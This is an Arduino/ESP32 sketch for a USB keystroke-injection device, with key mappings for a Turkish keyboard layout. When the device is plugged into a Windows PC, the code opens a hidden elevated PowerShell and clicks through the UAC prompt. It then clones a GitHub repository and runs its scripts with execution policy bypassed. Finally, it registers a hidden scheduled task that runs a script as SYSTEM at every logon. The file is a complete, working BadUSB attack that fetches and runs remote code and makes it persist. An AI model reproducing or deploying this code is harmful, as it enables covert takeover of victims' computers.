#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void trPrint(const String &text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text[i];

    switch (c) {
      case 'i':
        Keyboard.write('\'');
        break;

      case '"':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('2');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      case '.':
        Keyboard.write('/');
        break;

      case ':':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('/');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      case '/':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('7');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      case '\\':
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.write('q');
        delay(10);
        Keyboard.releaseAll();
        break;

      case '-':
        Keyboard.write('=');
        break;

      case '_':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('=');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;

      default:
        if (c >= 'A' && c <= 'Z') {
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.write(tolower(c));
          Keyboard.release(KEY_LEFT_SHIFT);
        } else {
          Keyboard.write(c);
        }
        break;
    }

    delay(15);
  }
}

void setup() {
  USB.begin();
  Keyboard.begin();

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(600);

  trPrint("powershell -w h");
  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000); 

  Keyboard.write(KEY_LEFT_ARROW);
  delay(400);
  Keyboard.write(KEY_RETURN);
  delay(100);

  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git");
  Keyboard.write(KEY_RETURN);
  delay(4000);

  trPrint("cd BashExe");
  Keyboard.write(KEY_RETURN);

  trPrint("powershell.exe -NoProfile -ExecutionPolicy Bypass -File change.ps1");
  Keyboard.write(KEY_RETURN);
  delay(400);
  
  Keyboard.print("$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\WINDOWS\\system32\\BashExe\\prts.ps1\" -WorkingDirectory \"C:\\WINDOWS\\system32\\BashExe\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries; Register-ScheduledTask -TaskName \"MasaustuPrtsGorevi\" -Action $action -Trigger $trigger -Settings $settings -User \"NT AUTHORITY\\SYSTEM\" -Force");
  delay(800);
  Keyboard.write(KEY_RETURN);
  delay(800);
  
  Keyboard.print("powershell.exe -NoProfile -ExecutionPolicy Bypass -File prts.ps1");
  Keyboard.write(KEY_RETURN);
  delay(400);

  Keyboard.print("exit");
  delay(400);
  Keyboard.write(KEY_RETURN);
  
}

void loop() {

}
